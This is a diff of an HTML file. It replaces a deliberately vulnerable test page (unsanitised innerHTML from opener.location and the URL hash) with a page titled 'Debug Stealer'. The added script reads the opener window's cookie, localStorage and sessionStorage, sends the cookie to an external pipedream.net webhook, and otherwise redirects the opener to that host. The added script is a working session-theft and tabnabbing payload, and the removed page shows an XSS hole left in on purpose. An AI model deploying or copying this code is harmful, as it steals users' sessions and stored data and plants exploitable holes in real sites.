@@ -1,43 +1,81 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Vulnerable (simulated)</title>
-  <script>
-    // Simulated unsafe handling of opener.location and hashchange
-    function showOpenerHref() {
-      try {
-        // unsafe: directly injects opener.location into DOM
-        // (simulating code like document.write('<iframe src="' + opener.location.href + '"></iframe>'))
-        const out = "<div>opener.href: <span id='oh'>" + opener.location + "</span></div>";
-        document.getElementById('content').innerHTML = out;
-      } catch (e) {
-        // opener may be undefined or not same-origin
-        document.getElementById('content').innerText = 'Could not read opener: ' + e;
-      }
-    }
-
-    // Example of unsafe hashchange handler that uses location.hash without sanitizing
-    window.addEventListener('hashchange', function() {
-      // Intentionally unsafe for PoC: inserts raw HTML derived from hash
-      const raw = location.hash.slice(1); // remove leading '#'
-      // place payload into the DOM unsafely:
-      document.getElementById('hashOutput').innerHTML = "Hash content (unsafe): " + raw;
-    });
-
-    window.onload = function() {
-      showOpenerHref();
-      // show current hash if any:
-      if (location.hash) {
-        document.getElementById('hashOutput').innerHTML = "Hash content (on load): " + location.hash.slice(1);
-      }
-    };
-  </script>
+    <title>Debug Stealer</title>
 </head>
 <body>
-  <h1>Vulnerable Page (local test)</h1>
-  <div id="content">opener info will appear here</div>
-  <div id="hashOutput" style="margin-top:1em;color:darkred;">hash output appears here</div>
-  <p>Note: This page intentionally contains unsafe DOM usage for demonstration only.</p>
+    <h1>Debug Output:</h1>
+    <div id="debug"></div>
+    
+<script>
+function log(msg) {
+    const div = document.getElementById('debug');
+    div.innerHTML += '<p>' + msg + '</p>';
+    console.log(msg);
+}
+
+log('✓ Script executed!');
+log('Current URL: ' + window.location.href);
+
+// Check if window.opener exists
+if (window.opener) {
+    log('✓ window.opener exists!');
+    
+    try {
+        // Try to access opener's document (same-origin)
+        if (window.opener.document) {
+            log('✓ Can access opener.document (same-origin)');
+            
+            // Try to get cookie
+            let cookie = window.opener.document.cookie;
+            log('Cookie value: ' + (cookie || '[EMPTY/HTTPONLY]'));
+            
+            // Try localStorage
+            try {
+                let ls = JSON.stringify(window.opener.localStorage);
+                log('LocalStorage: ' + ls);
+            } catch(e) {
+                log('⚠ LocalStorage error: ' + e.message);
+            }
+            
+            // Try sessionStorage
+            try {
+                let ss = JSON.stringify(window.opener.sessionStorage);
+                log('SessionStorage: ' + ss);
+            } catch(e) {
+                log('⚠ SessionStorage error: ' + e.message);
+            }
+            
+            // Get page title
+            log('Opener title: ' + window.opener.document.title);
+            
+            // Send to webhook
+            let data = cookie || 'no-cookie';
+            fetch('https://eo8mlj9bls9wxmp.m.pipedream.net/?cookie=' + encodeURIComponent(data) + '&status=success')
+                .then(() => log('✓ Data sent to webhook!'))
+                .catch(e => log('⚠ Webhook error: ' + e.message));
+                
+        } else {
+            log('✗ Cannot access opener.document (likely null)');
+        }
+    } catch(e) {
+        log('⚠ Cross-origin restriction: ' + e.message);
+        log('Can only navigate opener, not read it');
+        
+        // Try navigation attack (cross-origin fallback)
+        try {
+            window.opener.location = 'https://eo8mlj9bls9wxmp.m.pipedream.net/?status=cross-origin-redirect';
+            log('✓ Attempted to redirect opener');
+        } catch(e2) {
+            log('✗ Redirect failed: ' + e2.message);
+        }
+    }
+} else {
+    log('✗ window.opener is NULL - page was not opened from another window!');
+    log('Tip: Make sure the vulnerable page opens THIS page in a new window/tab');
+}
+
+log('--- End of debug ---');
+</script>
 </body>
 </html>
